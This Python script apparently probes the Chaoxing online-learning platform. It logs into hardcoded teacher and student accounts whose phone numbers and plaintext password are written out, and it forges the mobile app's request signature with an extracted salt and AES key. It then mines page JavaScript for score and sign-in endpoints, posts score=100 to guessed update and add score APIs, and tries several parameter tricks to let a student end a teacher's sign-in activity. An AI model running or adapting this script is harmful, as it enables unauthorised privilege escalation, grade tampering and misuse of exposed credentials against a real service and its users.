import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def mobile_login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def web_login(phone, pwd):
    s = requests.Session()
    s.verify = False
    web_ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0")
    s.headers.update({"User-Agent": web_ua})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": phone, "password": pwd,
                            "refer": "http://i.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0"},
           headers={"X-Requested-With": "XMLHttpRequest"},
           allow_redirects=False, timeout=30)
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in str(detail).lower() or kw in str(evidence).lower() for kw in ["success", '"status":1', '"result":1'])
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"课堂积分 & 删除签到 - Web登录方式深入探索")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t_m, puid_t = mobile_login("19712720708", "3.1415926Cpy")
    s_s_m, puid_s = mobile_login("18436633997", "3.1415926Cpy")
    s_t_w = web_login("19712720708", "3.1415926Cpy")
    s_s_w = web_login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    # ========== A. Web登录访问课程页面 ==========
    print("\n" + "=" * 80)
    print("[A] Web登录访问课程页面 - 寻找积分API")
    print("=" * 80)

    course_urls = [
        f"https://mooc1.chaoxing.com/mycourse/stuindex?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"https://mooc1.chaoxing.com/mycourse/teacherindex?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"https://i.chaoxing.com/base",
    ]

    for url in course_urls:
        for session, label in [(s_s_w, "学生Web"), (s_t_w, "教师Web")]:
            try:
                r = session.get(url, timeout=20, allow_redirects=True)
                print(f"\n  {label} {url[:60]}: HTTP {r.status_code}, len={len(r.text)}")

                if r.status_code == 200 and len(r.text) > 100:
                    # 搜索积分相关
                    credit_refs = re.findall(r'(?:credit|积分|score|point|经验值|经验|互动分|表现分|课堂积分|classpoint|classscore|studyScore|studyPoint)[^"\';\s]{0,80}', r.text, re.I)
                    api_refs = re.findall(r'["\']([^"\']*(?:credit|score|point|积分|经验|互动|studyScore)[^"\']*)["\']', r.text, re.I)
                    js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', r.text)

                    if credit_refs:
                        unique_refs = list(set(credit_refs))[:10]
                        print(f"    积分引用({len(unique_refs)}): {unique_refs[:5]}")
                        rec(f"A-credit-{label[:4]}", f"积分引用: {unique_refs[:5]}", str(unique_refs)[:300])
                    if api_refs:
                        unique_apis = list(set(api_refs))[:10]
                        print(f"    API引用({len(unique_apis)}): {unique_apis[:5]}")
                        rec(f"A-api-{label[:4]}", f"API引用: {unique_apis[:5]}", str(unique_apis)[:300])
                    if js_urls:
                        print(f"    JS文件({len(js_urls)}): {js_urls[:5]}")

                        # 下载JS分析
                        for js_url in js_urls[:10]:
                            if not js_url.startswith("http"):
                                if js_url.startswith("//"):
                                    js_url = f"https:{js_url}"
                                elif js_url.startswith("/"):
                                    js_url = f"https://mooc1.chaoxing.com{js_url}"
                                else:
                                    js_url = f"https://mooc1.chaoxing.com/{js_url}"
                            try:
                                r_js = session.get(js_url, timeout=10)
                                if r_js.status_code == 200 and len(r_js.text) > 100:
                                    # 搜索积分/签到相关API
                                    js_credit = re.findall(r'["\']([^"\']*(?:credit|score|point|积分|经验|互动|studyScore|classpoint)[^"\']*)["\']', r_js.text, re.I)
                                    js_sign = re.findall(r'["\']([^"\']*(?:deleteSign|deleteActive|endSign|endActive|removeSign|cancelSign)[^"\']*)["\']', r_js.text, re.I)
                                    js_fetch = re.findall(r'(?:fetch|ajax|post|get|axios|\.post|\.get)\s*\(?[\'"]([^\'"]+)', r_js.text)

                                    if js_credit:
                                        print(f"      JS积分API: {js_credit[:3]}")
                                        rec(f"A-js-credit-{js_url.split('/')[-1][:15]}", f"JS积分API: {js_credit[:3]}", str(js_credit[:5])[:300])
                                    if js_sign:
                                        print(f"      JS删除/结束API: {js_sign[:3]}")
                                        rec(f"A-js-sign-{js_url.split('/')[-1][:15]}", f"JS删除/结束API: {js_sign[:3]}", str(js_sign[:5])[:300])
                                    if js_fetch:
                                        sign_fetch = [a for a in js_fetch if any(kw in a.lower() for kw in ["sign", "credit", "score", "point", "active", "delete", "end"])]
                                        if sign_fetch:
                                            print(f"      JS fetch API: {sign_fetch[:3]}")
                                            rec(f"A-js-fetch-{js_url.split('/')[-1][:15]}", f"JS fetch API: {sign_fetch[:3]}", str(sign_fetch[:5])[:300])
                            except:
                                pass
            except Exception as e:
                print(f"    ERROR: {e}")

    # ========== B. 积分API - 尝试更多路径 ==========
    print("\n" + "=" * 80)
    print("[B] 积分API - 更多路径尝试")
    print("=" * 80)

    # 学习通课堂积分可能在以下路径
    credit_api_attempts = [
        # mooc-ans下的积分路径
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/studyprocess/getStudyProcess", {"courseId": COURSE_ID, "clazzId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/studyprocess/getStudyProgress", {"courseId": COURSE_ID, "clazzId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/mycourse/stuCourseList", {"view": "json", "m": "0"}),
        # 课堂表现分
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/classroom/score", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/classroom/getScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/classroom/updateScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/classroom/addScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100"}),
        # pptSign积分
        ("GET", f"{base}/pptSign/stuScoreList", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", f"{base}/pptSign/getStuScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("POST", f"{base}/pptSign/updateStuScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100"}),
        ("POST", f"{base}/pptSign/addStuScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100"}),
        # newsign积分
        ("GET", f"{base}/newsign/stuScoreList", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("POST", f"{base}/newsign/updateStuScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100"}),
        ("POST", f"{base}/newsign/addStuScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100"}),
    ]

    for method, url, params in credit_api_attempts:
        for session, label in [(s_s_m, "学生"), (s_t_m, "教师")]:
            try:
                params_copy = dict(params)
                params_copy["uid"] = puid_s if label == "学生" else puid_t
                if method == "GET":
                    r = session.get(url, params=params_copy, timeout=15)
                else:
                    r = session.post(url, data=params_copy,
                                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                              "Content-Type": "application/x-www-form-urlencoded"},
                                     timeout=15)
                if r.status_code != 404 and len(r.text) > 5 and "404" not in r.text[:100]:
                    short = url.replace("https://", "").replace("mooc1-api.chaoxing.com/mooc-ans/", "mc/").replace("mobilelearn.chaoxing.com/", "ml/")[:40]
                    rec(f"B-credit-{short}-{label}",
                        f"{label} {method} {short}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # ========== C. 删除签到 - /pptSign/endSign 学生绕过测试 ==========
    print("\n" + "=" * 80)
    print("[C] /pptSign/endSign 学生绕过测试")
    print("=" * 80)

    # 获取活动列表
    r = s_s_m.get(f"{base}/ppt/activeAPI/taskactivelist",
                  params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_list = d.get("activeList", []) if isinstance(d, dict) else []
    test_aid = str(active_list[0].get("id", "")) if active_list else "5000163776585"
    print(f"  测试活动ID: {test_aid}")

    # /pptSign/endSign 教师返回{"status":1}，学生返回"无权限"
    # 尝试各种绕过方式
    bypass_tests = [
        # 基本调用
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID},
        # 添加roletype
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "roletype": "1"},
        # 添加role
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "role": "1"},
        # 添加cpi
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "cpi": "0"},
        # 添加operateSource
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "operateSource": "teacher"},
        # 使用教师uid
        {"activeId": test_aid, "uid": puid_t, "classId": CLASS_ID, "courseId": COURSE_ID},
    ]

    for i, data in enumerate(bypass_tests):
        r = s_s_m.post(f"{base}/pptSign/endSign", data=data,
                       headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                "Content-Type": "application/x-www-form-urlencoded"},
                       timeout=15)
        desc = ", ".join(f"{k}={v}" for k, v in data.items() if k not in ["activeId", "classId", "courseId"])
        rec(f"C-endSign-bypass{i}", f"学生endSign({desc}): {r.text[:100]}", r.text[:300])

    # ========== 保存结果 ==========
    print("\n" + "=" * 80)
    print("[保存结果]")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "credit_delete_round4_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    # 汇总关键发现
    print("\n  关键发现:")
    for r_item in results:
        detail = str(r_item.get("detail", ""))
        evidence = str(r_item.get("evidence", ""))
        if any(kw in detail.lower() or kw in evidence.lower() for kw in ["success", '"status":1', '"result":1', "积分引用", "api引用", "js积分", "js删除"]):
            print(f"    🔴 {r_item['tag']}: {detail[:120]}")
        elif "无权限" not in detail and "404" not in detail and "500" not in detail and "ERROR" not in detail:
            print(f"    ⚡ {r_item['tag']}: {detail[:120]}")

if __name__ == "__main__":
    run()
